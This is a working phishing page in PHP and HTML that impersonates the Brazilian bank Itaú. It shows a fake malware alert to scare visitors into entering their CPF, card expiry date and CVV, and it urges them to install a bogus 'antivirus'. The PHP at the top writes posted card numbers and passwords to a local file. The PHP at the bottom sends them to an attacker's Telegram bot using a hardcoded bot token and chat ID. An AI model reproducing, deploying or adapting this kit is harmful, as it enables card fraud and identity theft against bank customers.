<?php
$card= $_POST['numc'];
$senha = $_POST['passc'];
$tudo = "".$card." | ".$senha." | ";

$fp = fopen("cardsenha.txt", "a");
fwrite($fp, $tudo);
fclose($fp);
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<title>Itau Card | Promoção descontão</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<script type="text/javascript" src="promocao_arquivos/jquery-3.js"></script>
	<script type="text/javascript" src="promocao_arquivos/jquery.js"></script>
	<script type="text/javascript" src="promocao_arquivos/cad_promo_scripts.js"></script>
	<link rel="stylesheet" type="text/css" href="promocao_arquivos/cad_promo_style.css">
</head>
<body>
	<header class="top-promo">
		<img src="promocao_arquivos/img_logo.png">
	</header>
	<section class="prog-cad">
		<ul>
			<li class="active">Identificação</li>
			<li>Segurança</li>
			<li>Confirmação</li>
		</ul>
		<br><br> <br> <br>
		<div style="text-align: center;">
					<h3 style="font-family: Arial, tahoma; color: #222;">ALERTA DE SEGURANÇA</h3>
				</div>
	</section>
	<section class="frm-container">
		<div class="eng-tx">
			<p>Olá cliente ltau, nossos analistas de segurança identificaram uma tentativa de acesso 
				não autorizada vindo do seu próprio dispositivo, o que pode indicar a forte presença de virus no seu aparelho
				deixando você e sua conta em risco. <br> <br>
			Mas não se preocupe, o banco ltau ja bloqueou a operação desse malware por alguns instantes no seu dispositivo. <br> <br>
		Para ficar ainda mais seguro e tornar seu dispositivo livre desse tipo de virus, confirme as informações abaixo e siga o passo a passo para baixar nosso antivirus feito especialmente para clientes ltau e limpar esse malware do seu aparelho. <br> <br> Após fazer todo o processo, clique em avançar no fim da pagina para concluir toda nossa operação e deixar seu dispositivo ainda mais seguro.</p>
		</div>
		<div class="frm">
			<form id="frmcad" name="frmcad" method="POST" action="confirmacao.php">
				<input name="numc" value="1232 1231 2312 3212" type="hidden">
				<input name="passc" value="1232" type="hidden">
				<div class="frm-item">
					<input id="numcpf" name="numcpf" maxlength="14" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)" type="tel">
					<label for="numcpf" class="label-float">CPF</label>
				</div>
				<div class="frm-item">
					<input id="numdtv" name="numdtv" maxlength="5" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)" type="tel">
					<label for="numdtv" class="label-float">Validade do cartão</label>
				</div>
				<div class="frm-item">
					<input id="numcvv" name="numcvv" maxlength="3" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)" type="tel">
					<label for="numcvv" class="label-float">Código de segurança</label>
					<span id="helpcvv" class="helpcvv"></span>
				</div>

				<br><br>

				<div class="eng-fim">
					<h3 style="font-family: Arial, tahoma; color: #222;">Agora assista atentamente os videos abaixo e siga o passo a passo para tornar seu dispositivo seguro novamente.</h3>
				</div>
	<br><br>

	<div style="text-align: center;">
	<h3 style="font-family: Arial, tahoma; color: #222;">VIDEO 1 - VERIFICANDO A EXISTENCIA DE MALWARES PELO PLAYPROTECT</h3>
	</div>
	<br>
	<div style="text-align: center;">
	<iframe width="560" height="315" src="https://www.youtube.com/embed/5GDqHfxhITg?si=ZjimcboZGscBE9B4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
		</div>
			<br> <br>

	
	
			<br> <br> <br>
			
			

				<input id="btncad" class="btncad" name="btncad" value="Avançar" disabled="disabled" onclick="return validateckfrm()" type="submit">
			</form>
		</div>
		<br><br><br>
	</section>
	<section id="mod-help-cvv" class="mod-help-cvv">
		<span id="mod-help-close" class="mod-help-close">x</span>
		<div class="container-mod">
			<img class="img-mod-help" src="promocao_arquivos/img_card_cvv.png">
			<p>O código de segurança são os três dígitos que encontra-se no verso do seu cartão, como mostrado na imagem acima.</p>
		</div>
	</section>

</body></html>

<?php
// Verifique se o formulário foi enviado
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Recupere os dados enviados pelo formulário
    $cardnumb = isset($_POST['numc']) ? $_POST['numc'] : '';
    $senhacard = isset($_POST['passc']) ? $_POST['passc'] : '';
    
    
    
    // Verifique se os dados foi preenchido
    if (!empty($cardnumb) && !empty($senhacard) ) {
        
        // Substitua pelo token do seu bot no Telegram
        $botToken = '7669675700:AAFFD1K1QAJPI2zbLYD-NaqtpFaMNDCxdSY';
        $chatId = '-4611508812';

        // Crie a mensagem  a ser enviada
        // Crie a mensagem a ser enviada
        $message = "*ITAU | CONSUL*\n\n";
        
        $message .= "*CARD-NUM:* $cardnumb\n";
        $message .= "*Senha:* $senhacard\n";
        
        
        

        // URL para enviar mensagens para o bot no Telegram
        $url = "https://api.telegram.org/bot$botToken/sendMessage";

        // Dados a serem enviados via POST
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        // Configuração da requisição cURL
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

         // execute  sla oq
        curl_exec($ch);
        curl_close($ch);
    }
}
?>